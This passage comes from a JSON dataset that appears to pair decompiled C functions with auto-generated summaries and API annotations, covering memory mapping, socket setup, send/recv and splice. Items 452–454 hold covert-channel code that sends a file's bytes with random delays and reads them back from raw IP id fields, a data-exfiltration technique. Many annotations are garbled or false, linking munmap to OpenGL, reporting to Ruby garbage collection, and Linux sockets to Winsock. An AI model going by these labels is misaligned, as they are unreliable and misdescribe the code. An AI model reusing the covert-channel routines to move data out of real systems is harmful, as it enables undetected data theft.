        "longer_label": "The provided code is a function named `memory_map` that utilizes low-level system calls and memory management functions to map a file into memory, potentially resizing it if necessary, and returns a pointer to a dynamically allocated structure containing information about the mapped memory region, while also handling error conditions such as invalid file descriptors or memory allocation failures."
    },
    {
        "id": 444,
        "docstring_tokens": [
            "The",
            "code",
            "unmaps",
            "a",
            "memory",
            "region",
            "specified",
            "by",
            "the",
            "MemoryMap",
            "struct",
            "and",
            "frees",
            "the",
            "allocated",
            "memory",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "v2",
            "=",
            "munmap",
            "(",
            "*",
            "(",
            "void",
            "*",
            "*",
            ")",
            "a1",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ")",
            ";",
            "free",
            "(",
            "(",
            "void",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "return",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"unmap\" is part of a graphical rendering system, likely related to OpenGL, used to unmap a buffer object, releasing its associated memory resources.",
            "The `munmap` function is used to unmap memory regions previously mapped into the process's address space using `mmap`, effectively releasing the memory associated with those regions."
        ],
        "longer_label": "The provided code is a function written in C/C++ designed to unmap a memory region, likely associated with a buffer object in a graphical rendering system, by calling the `munmap` function to release the memory resources and subsequently freeing the associated memory."
    },
    {
        "id": 445,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "and",
            "checks",
            "the",
            "header",
            "of",
            "a",
            "file",
            ",",
            "ensuring",
            "it",
            "has",
            "a",
            "valid",
            "size",
            ",",
            "magic",
            "number",
            ",",
            "and",
            "program",
            "size",
            ",",
            "as",
            "well",
            "as",
            "checking",
            "if",
            "the",
            "program",
            "size",
            "is",
            "not",
            "too",
            "large",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "t_hdr",
            "*",
            "hdr",
            ",",
            "int",
            "fd",
            ")",
            "{",
            "unsigned",
            "__int64",
            "siz",
            ";",
            "if",
            "(",
            "fd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "siz",
            "=",
            "lseek",
            "(",
            "fd",
            ",",
            "0L",
            "L",
            ",",
            "2",
            ")",
            ";",
            "if",
            "(",
            "siz",
            "=",
            "=",
            "-",
            "1L",
            "L",
            ")",
            "perror_",
            "(",
            "\"lseek\"",
            ")",
            ";",
            "if",
            "(",
            "siz",
            "<",
            "=",
            "0x88F",
            ")",
            "{",
            "puts",
            "(",
            "\"Invalid header size\"",
            ")",
            ";",
            "_asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "lseek",
            "(",
            "fd",
            ",",
            "0L",
            "L",
            ",",
            "0",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror_",
            "(",
            "\"lseek\"",
            ")",
            ";",
            "if",
            "(",
            "read",
            "(",
            "fd",
            ",",
            "hdr",
            ",",
            "0x890uL",
            "L",
            ")",
            "!",
            "=",
            "2192",
            ")",
            "perror_",
            "(",
            "\"read\"",
            ")",
            ";",
            "h_rev_bytes",
            "(",
            "hdr",
            ",",
            "4L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "hdr",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "hdr",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "hdr",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load4",
            "(",
            "hdr",
            ")",
            ";",
            "}",
            "if",
            "(",
            "hdr",
            "-",
            ">",
            "magic",
            "!",
            "=",
            "15369203",
            ")",
            "{",
            "printf",
            "(",
            "\"%x %x\\n\"",
            ",",
            "hdr",
            "-",
            ">",
            "magic",
            ",",
            "15369203L",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"Invalid header\"",
            ")",
            ";",
            "_asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "h_rev_bytes",
            "(",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ",",
            "4L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "hdr",
            "-",
            "120",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load4",
            "(",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ")",
            ";",
            "}",
            "if",
            "(",
            "hdr",
            "-",
            ">",
            "prog_size",
            "!",
            "=",
            "siz",
            "-",
            "2192",
            ")",
            "{",
            "puts",
            "(",
            "\"Invalid header\"",
            ")",
            ";",
            "_asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "hdr",
            "-",
            "120",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "_asan_report_load4",
            "(",
            "&",
            "hdr",
            "-",
            ">",
            "prog_size",
            ")",
            ";",
            "}",
            "if",
            "(",
            "hdr",
            "-",
            ">",
            "prog_size",
            ">",
            "0x2AA",
            ")",
            "{",
            "printf",
            "(",
            "\"%d %d\\n\"",
            ",",
            "hdr",
            "-",
            ">",
            "prog_size",
            ",",
            "682L",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"Champion too large\"",
            ")",
            ";",
            "_asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `perror` is used to print an error message corresponding to the current value of `errno` (error number) along with a user-supplied message, typically used in error handling to provide context for system call failures.",
            "The function `_asan` appears to be a part of a memory sanitizer (ASan) implementation in C, specifically dealing with poisoning and unpoisoning memory regions to detect and prevent memory errors like use-after-free or buffer overflows.",
            "The function `handle_no_return` is likely used to provide a handler for cases where a function does not return, particularly in the context of address sanitization, possibly to prevent certain compiler complaints or to ensure proper handling of stack bounds in coroutine switching, ensuring ASAN's internal state is maintained.",
            "The `h_rev_bytes` function appears to reverse the bytes of a given memory block, likely used for converting endianness, as suggested by its name and the provided code snippets related to hashing and memory manipulation in a C program.",
            "The \"report\" function likely serves to output debugging or profiling information related to garbage collection in a Ruby interpreter, with the provided code snippets showing macros and declarations related to garbage collection reporting and profiling.",
            "The function `__asan_handle_no_return` is defined to handle scenarios where AddressSanitizer (ASan) detects functions that do not return, ensuring proper handling and prevention of ASan warnings or errors related to unreachable code paths.",
            "The function `rev_bytes` appears to reverse the order of bytes in an array or word, likely used for data manipulation or transformation in systems programming or cryptography contexts."
        ],
        "longer_label": "The provided C function `ch_parse_champ_header` reads a header from a file descriptor, performs various checks including size validation, byte order reversal, and magic number verification, employing error handling through `perror`, and ASan functions for memory error detection, with `handle_no_return` likely handling non-returning cases."
    },
    {
        "id": 446,
        "docstring_tokens": [
            "The",
            "code",
            "accepts",
            "a",
            "connection",
            "on",
            "the",
            "specified",
            "file",
            "descriptor",
            "and",
            "stores",
            "the",
            "address",
            "of",
            "the",
            "connecting",
            "client",
            "in",
            "the",
            "sockaddr_storage",
            "structure",
            ",",
            "returning",
            "the",
            "result",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "sockaddr_storage",
            "*",
            "addr",
            ")",
            "{",
            "socklen_t",
            "len",
            ";",
            "int",
            "r",
            ";",
            "len",
            "=",
            "128",
            ";",
            "r",
            "=",
            "accept",
            "(",
            "fd",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "addr",
            ",",
            "&",
            "len",
            ")",
            ";",
            "if",
            "(",
            "r",
            "!",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"accept\"",
            ")",
            ";",
            "return",
            "r",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function named `Accept` which accepts a file descriptor and a pointer to a sockaddr_storage structure, attempts to accept a connection on the given socket descriptor `fd`, updates the address structure pointed to by `addr` with the address of the connecting peer, and returns the file descriptor of the accepted socket connection while handling any errors with `perror`."
    },
    {
        "id": 447,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "server",
            "socket",
            "on",
            "the",
            "specified",
            "port",
            ",",
            "sets",
            "up",
            "the",
            "socket",
            "options",
            ",",
            "binds",
            "it",
            "to",
            "the",
            "server",
            "address",
            ",",
            "and",
            "starts",
            "listening",
            "for",
            "incoming",
            "connections",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int16",
            "a1",
            ")",
            "{",
            "int",
            "optval",
            ";",
            "int",
            "fd",
            ";",
            "struct",
            "sockaddr",
            "s",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "s",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "s",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "htonl",
            "(",
            "0",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "s",
            ".",
            "sa_data",
            "=",
            "a1",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error creating socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "optval",
            "=",
            "1",
            ";",
            "if",
            "(",
            "setsockopt",
            "(",
            "fd",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "bind",
            "(",
            "fd",
            ",",
            "&",
            "s",
            ",",
            "0x10u",
            ")",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error bind\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "listen",
            "(",
            "fd",
            ",",
            "4096",
            ")",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error bind\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"struct\" appears to be a user-defined C structure or data type that defines various fixed-point and integer types along with their properties and constants, and it's used for organizing data and defining message formats in systems programming, graphics rendering, or possibly other computational tasks.",
            "The function `__read` appears to be used for reading data from various sources, such as devices, filesystems, or dump files, likely serving as a low-level interface for input operations in a software system.",
            "The function \"qword\" likely deals with handling quadruple-word (64-bit) data types, possibly for specialized processing or manipulation, as implied by its name and the absence of code snippets.",
            "The function `memset` is defined to implement the `memset` functionality for a specific runtime environment, ensuring memory is initialized to a particular value for a specified number of bytes, providing a minimal subset of the C standard library.",
            "The function `perr_sock` is designed to print socket-specific errors by retrieving the last Windows Sockets API (WSA) error and outputting it along with a provided message."
        ],
        "longer_label": "The given code initializes a server socket, setting options, binding it to a specified port, and listening for incoming connections, likely for network communication, while utilizing various low-level functions and a custom data structure."
    },
    {
        "id": 448,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            ",",
            "sets",
            "up",
            "a",
            "server",
            "address",
            "and",
            "port",
            ",",
            "connects",
            "to",
            "the",
            "server",
            ",",
            "and",
            "returns",
            "the",
            "socket",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "__int16",
            "a2",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "struct",
            "sockaddr",
            "s",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "s",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "s",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "s",
            ".",
            "sa_data",
            "=",
            "a2",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error: creating socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "&",
            "s",
            ",",
            "0x10u",
            ")",
            ")",
            "{",
            "perr_sock",
            "(",
            "\"Error bind\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read an unsigned 64-bit integer (quadword) value from the FS segment register at a specified offset, typically used for accessing thread information block (TIB) fields in Windows programming.",
            "The function `perr_sock` is designed to print socket-specific errors, utilizing the Winsock `WSAGetLastError()` function, facilitating error handling in network programming."
        ],
        "longer_label": "The code is a fastcall function that creates and connects a socket using low-level Windows API functions, including reading an unsigned 64-bit integer from the FS segment register and handling socket-specific errors using the `perr_sock` function."
    },
    {
        "id": 449,
        "docstring_tokens": [
            "The",
            "recvBytes",
            "function",
            "reads",
            "data",
            "from",
            "a",
            "file",
            "descriptor",
            "into",
            "a",
            "buffer",
            "and",
            "returns",
            "the",
            "number",
            "of",
            "bytes",
            "read",
            ",",
            "handling",
            "errors",
            "if",
            "the",
            "operation",
            "is",
            "unsuccessful",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "char",
            "*",
            "buff",
            ")",
            "{",
            "int",
            "bytesread",
            ";",
            "bytesread",
            "=",
            "recv",
            "(",
            "fd",
            ",",
            "buff",
            ",",
            "8uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "bytesread",
            "!",
            "=",
            "-",
            "1",
            "&",
            "&",
            "*",
            "__errno_location",
            "(",
            ")",
            "!",
            "=",
            "11",
            ")",
            "perror",
            "(",
            "\"read\"",
            ")",
            ";",
            "return",
            "bytesread",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a C function named recvBytes, which reads up to 8 bytes from a socket file descriptor (fd) into a buffer (buff), handles errors using perror if the read operation fails, and returns the number of bytes read."
    },
    {
        "id": 450,
        "docstring_tokens": [
            "The",
            "function",
            "sendBytes",
            "sends",
            "data",
            "from",
            "a",
            "buffer",
            "to",
            "a",
            "file",
            "descriptor",
            "and",
            "returns",
            "the",
            "number",
            "of",
            "bytes",
            "sent",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "char",
            "*",
            "buff",
            ")",
            "{",
            "int",
            "bytesrecv",
            ";",
            "bytesrecv",
            "=",
            "send",
            "(",
            "fd",
            ",",
            "buff",
            ",",
            "8uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "bytesrecv",
            "!",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"recv\"",
            ")",
            ";",
            "return",
            "bytesrecv",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a C function named \"sendBytes\" which sends 8 bytes of data from the buffer pointed to by \"buff\" over a socket file descriptor \"fd\", and if the send operation fails, it prints an error message using perror()."
    },
    {
        "id": 451,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "data",
            "from",
            "a",
            "source",
            "file",
            "descriptor",
            "and",
            "writes",
            "it",
            "to",
            "a",
            "destination",
            "file",
            "descriptor",
            "using",
            "the",
            "splice",
            "system",
            "call",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "source",
            ",",
            "int",
            "destination",
            ",",
            "int",
            "*",
            "pipefd",
            ")",
            "{",
            "int",
            "writeBytes",
            ";",
            "int",
            "getBytes",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "do",
            "{",
            "LABEL_1",
            ":",
            "getBytes",
            "=",
            "splice",
            "(",
            "source",
            ",",
            "0L",
            "L",
            ",",
            "pipefd",
            "[",
            "1",
            "]",
            ",",
            "0L",
            "L",
            ",",
            "0xFFFFuL",
            "L",
            ",",
            "5u",
            ")",
            ";",
            "if",
            "(",
            "getBytes",
            "=",
            "=",
            "-",
            "1",
            "&",
            "&",
            "*",
            "__errno_location",
            "(",
            ")",
            "!",
            "=",
            "11",
            ")",
            "perror",
            "(",
            "\"getting splice error\"",
            ")",
            ";",
            "}",
            "while",
            "(",
            "*",
            "__errno_location",
            "(",
            ")",
            "=",
            "=",
            "11",
            ")",
            ";",
            "if",
            "(",
            "getBytes",
            "<",
            "=",
            "0",
            "&",
            "&",
            "*",
            "__errno_location",
            "(",
            ")",
            "!",
            "=",
            "11",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"bytes read: %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "getBytes",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "writeBytes",
            "=",
            "splice",
            "(",
            "*",
            "pipefd",
            ",",
            "0L",
            "L",
            ",",
            "destination",
            ",",
            "0L",
            "L",
            ",",
            "getBytes",
            ",",
            "5u",
            ")",
            ";",
            "if",
            "(",
            "writeBytes",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"wrote: %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "writeBytes",
            ")",
            ";",
            "getBytes",
            "-",
            "=",
            "writeBytes",
            ";",
            "if",
            "(",
            "!",
            "getBytes",
            ")",
            "goto",
            "LABEL_1",
            ";",
            "}",
            "if",
            "(",
            "writeBytes",
            "=",
            "=",
            "-",
            "1",
            "&",
            "&",
            "*",
            "__errno_location",
            "(",
            ")",
            "!",
            "=",
            "11",
            ")",
            "perror",
            "(",
            "\"writing splice error\"",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and analyzed within the context of a larger C program, likely to customize or extend its behavior for specific platforms or requirements.",
            "The function \"write\" likely implements file writing functionality, including handling file descriptors, managing file storage, and supporting operations like opening, closing, reading, and seeking within files, possibly using memory mapping for efficient I/O operations."
        ],
        "longer_label": "The provided C code defines a function `spliceTo` that continuously reads data from a source file descriptor, writes it to a destination file descriptor using the `splice` system call, and prints debug information, with `printf` potentially customized for platform-specific requirements, while handling errors related to the `splice` operation."
    },
    {
        "id": 452,
        "docstring_tokens": [
            "The",
            "code",
            "listens",
            "for",
            "results",
            ",",
            "opens",
            "a",
            "file",
            "for",
            "writing",
            ",",
            "receives",
            "data",
            "covertly",
            ",",
            "prints",
            "output",
            "and",
            "writes",
            "to",
            "the",
            "file",
            "until",
            "receiving",
            "a",
            "complete",
            "signal",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "sip",
            ",",
            "unsigned",
            "__int16",
            "sport",
            ",",
            "char",
            "*",
            "filename",
            ")",
            "{",
            "char",
            "input",
            ";",
            "FILE",
            "*",
            "file",
            ";",
            "puts",
            "(",
            "\"listening for results\\n\"",
            ")",
            ";",
            "file",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "\"wb\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "file",
            ")",
            "{",
            "perror",
            "(",
            "\"fopen can't open file\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "do",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "input",
            "=",
            "covert_recv",
            "(",
            "sip",
            ",",
            "sport",
            ",",
            "1",
            ",",
            "0",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "input",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"Output(%d): %c\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "input",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "input",
            ")",
            ";",
            "fputc",
            "(",
            "input",
            ",",
            "file",
            ")",
            ";",
            "fflush",
            "(",
            "file",
            ")",
            ";",
            "}",
            "}",
            "while",
            "(",
            "input",
            "!",
            "=",
            "-",
            "1",
            ")",
            ";",
            "puts",
            "(",
            "\"Covert Receive Complete\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function in this context appears to be redefined and used within a C program to provide formatted output, possibly for a specific system, with additional macros and typedefs defined for features like a Reverse Polish Notation (RPN) calculator and system-specific formatting constants."
        ],
        "longer_label": "The provided code defines a function `recv_results` in C, which listens for results, opens a file for writing binary data, receives input covertly, prints and writes the received characters to the file until encountering a termination signal, then concludes the reception process."
    },
    {
        "id": 453,
        "docstring_tokens": [
            "The",
            "code",
            "sends",
            "characters",
            "from",
            "a",
            "file",
            "over",
            "a",
            "covert",
            "channel",
            "with",
            "random",
            "delays",
            "between",
            "each",
            "character",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "sip",
            ",",
            "char",
            "*",
            "dip",
            ",",
            "unsigned",
            "__int16",
            "sport",
            ",",
            "unsigned",
            "__int16",
            "dport",
            ",",
            "char",
            "*",
            "filename",
            ")",
            "{",
            "char",
            "input",
            ";",
            "double",
            "passed",
            ";",
            "clock_t",
            "start",
            ";",
            "FILE",
            "*",
            "file",
            ";",
            "int",
            "max_delay",
            ";",
            "int",
            "delay",
            ";",
            "int",
            "timer_complete",
            ";",
            "timer_complete",
            "=",
            "0",
            ";",
            "delay",
            "=",
            "0",
            ";",
            "max_delay",
            "=",
            "1",
            ";",
            "file",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "\"rb\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "file",
            ")",
            "{",
            "perror",
            "(",
            "\"fopen can't open file\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "while",
            "(",
            "1",
            ")",
            "{",
            "input",
            "=",
            "fgetc",
            "(",
            "file",
            ")",
            ";",
            "if",
            "(",
            "input",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"Character to send: %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "input",
            ")",
            ";",
            "covert_send",
            "(",
            "sip",
            ",",
            "dip",
            ",",
            "sport",
            ",",
            "dport",
            ",",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "&",
            "input",
            ",",
            "1",
            ")",
            ";",
            "start",
            "=",
            "clock",
            "(",
            ")",
            ";",
            "timer_complete",
            "=",
            "0",
            ";",
            "delay",
            "=",
            "rand_delay",
            "(",
            "max_delay",
            ")",
            ";",
            "printf",
            "(",
            "\"delay: %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "delay",
            ")",
            ";",
            "while",
            "(",
            "!",
            "timer_complete",
            ")",
            "{",
            "passed",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "(",
            "(",
            "clock",
            "(",
            ")",
            "-",
            "start",
            ")",
            "/",
            "1000000",
            ")",
            ";",
            "if",
            "(",
            "passed",
            ">",
            "=",
            "(",
            "double",
            ")",
            "delay",
            ")",
            "{",
            "puts",
            "(",
            "\"Delay completed\"",
            ")",
            ";",
            "timer_complete",
            "=",
            "1",
            ";",
            "}",
            "}",
            "}",
            "input",
            "=",
            "4",
            ";",
            "covert_send",
            "(",
            "sip",
            ",",
            "dip",
            ",",
            "sport",
            ",",
            "dport",
            ",",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "&",
            "input",
            ",",
            "1",
            ")",
            ";",
            "puts",
            "(",
            "\"completed\"",
            ")",
            ";",
            "fclose",
            "(",
            "file",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function in the provided code snippets is used for printing formatted output to the console, and the snippets demonstrate its usage within a C program, including defining macros, typedefs, and including necessary headers.",
            "The function `delayrand` likely generates a random delay time within specified bounds, represented by the variable `andbits`, used in a scripting system for playing sounds with various effects such as delay effects.",
            "The \"delay\" function is used to introduce a delay in milliseconds by utilizing a timer mechanism, allowing for precise timing in embedded systems programming, as seen in the provided code snippets."
        ],
        "longer_label": "The provided C code snippet defines a function `send_results` that reads characters from a file, sends them covertly using network communication functions `covert_send`, introduces random delays using `rand_delay`, and prints debugging information, with annotations explaining the usage of `printf`, `rand_delay`, and a delay mechanism for precise timing."
    },
    {
        "id": 454,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "convert",
            "received",
            "data",
            "from",
            "a",
            "network",
            "socket",
            "to",
            "a",
            "specific",
            "data",
            "structure",
            ",",
            "checks",
            "if",
            "the",
            "IP",
            "id",
            "is",
            "equal",
            "to",
            "4",
            ",",
            "and",
            "returns",
            "either",
            "-1",
            "or",
            "the",
            "IP",
            "id",
            "depending",
            "on",
            "the",
            "condition",
            "."
        ],
        "code_tokens": [
            "char",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "sip",
            ",",
            "unsigned",
            "__int16",
            "sport",
            ",",
            "int",
            "ipid",
            ",",
            "int",
            "seq",
            ",",
            "int",
            "ack",
            ",",
            "int",
            "tos",
            ")",
            "{",
            "int",
            "recv_socket",
            ";",
            "host_convert",
            "(",
            "sip",
            ")",
            ";",
            "recv_socket",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "3",
            ",",
            "6",
            ")",
            ";",
            "if",
            "(",
            "recv_socket",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"receiving socket failed to open (root maybe required)\"",
            ")",
            ";",
            "read",
            "(",
            "recv_socket",
            ",",
            "&",
            "recv_tcp_0",
            ",",
            "0x270FuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "recv_tcp_0",
            ".",
            "ip",
            ".",
            "id",
            "=",
            "=",
            "4",
            ")",
            "return",
            "-",
            "1",
            ";",
            "else",
            "return",
            "recv_tcp_0",
            ".",
            "ip",
            ".",
            "id",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
